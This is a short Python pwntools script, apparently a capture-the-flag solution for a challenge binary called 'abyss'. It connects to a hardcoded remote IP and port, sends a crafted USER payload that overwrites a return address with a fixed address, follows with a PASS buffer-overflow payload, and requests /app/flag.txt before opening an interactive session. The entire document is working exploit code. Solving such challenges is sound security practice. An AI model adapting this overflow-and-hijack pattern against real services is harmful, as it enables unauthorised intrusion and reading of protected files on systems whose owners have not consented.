#!/usr/bin/env python3
from pwn import *

# Define the binary and set up context
binary_path = "../challenge/abyss"
elf = context.binary = ELF(binary_path)

# Establish a remote connection
remote_host = "94.237.50.221"
remote_port = 58547
connection = remote(remote_host, remote_port)

# Step 1: Send an initial payload with a null integer
connection.send(p32(0))
connection.recvrepeat(1)

# Step 2: Send the USER command with crafted payload
user_payload = (
    b"USER "
    + b"AAAAAAAABBBBBBBBC\x1cDDDDEEEEEEE"
    + p32(0x00000000004014eb)  # Overwrite return address
)
connection.send(user_payload)
connection.recvrepeat(1)

# Step 3: Send the PASS command with a buffer overflow
pass_payload = b"PASS " + b"D" * (512 - 5)  # Adjust for the command prefix
connection.send(pass_payload)
connection.recvrepeat(1)

# Step 4: Send the path to the target file
connection.send(b"/app/flag.txt")

# Step 5: Interact with the connection
connection.interactive()